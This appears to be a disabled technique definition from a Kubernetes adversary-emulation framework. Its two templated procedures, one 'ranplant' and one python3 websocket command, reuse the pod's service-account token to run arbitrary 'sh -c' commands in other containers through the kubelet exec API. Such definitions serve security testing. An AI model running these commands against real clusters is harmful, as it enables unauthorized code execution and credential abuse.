id: execute-via-get-node-proxy
name: Execute via Node/Proxy
description: Execute a command on a target node via the kubelet API proxy
tactic: Execution
techniques: ["Command and Scripting Interpreter: Unix Shell"]
status: disabled
preconditions:
  accessLevel: user-exec
  kind: System
  # rbac:
  # - verb: get
  #   resource: "nodes/proxy"
parameters:
  NAMESPACE:
    type: Namespace
    default: ${TARGET}
    description: Kubernetes namespace of the target pod
  POD_NAME:
    type: Pod
    default: ${TARGET}
    description: Name of the target pod
  CONTAINER:
    type: string
    description: Name of the target container in the pod
  NODE:
    type: Node
    description: Preferred node endpoint host. Grounding resolves to node IP first, then falls back to node name.
  COMMAND:
    type: string
    description: the command to execute in the shell
procedures:
  - key: ranplant
    tool: ranplant
    description: "Uses ${NODE} (IP-first, name-fallback). Explicit placeholders available: ${NODE.IP}, ${NODE.NAME}."
    command: >
      ranplant kubelet-exec --url "wss://${NODE}:10250/exec/${NAMESPACE}/${POD_NAME}/${CONTAINER}?output=1&error=1&command=sh&command=-c&command=${COMMAND|url_encode}" --token-file /var/run/secrets/kubernetes.io/serviceaccount/token --ca-file /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
  - key: python-ws
    tool: python3
    description: "Uses ${NODE} (IP-first, name-fallback). Explicit placeholders available: ${NODE.IP}, ${NODE.NAME}."
    command: >
      TOKEN="$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" python3 ws.py "wss://${NODE}:10250/exec/${NAMESPACE}/${POD_NAME}/${CONTAINER}?output=1&error=1&command=sh&command=-c&command=${COMMAND|url_encode}"
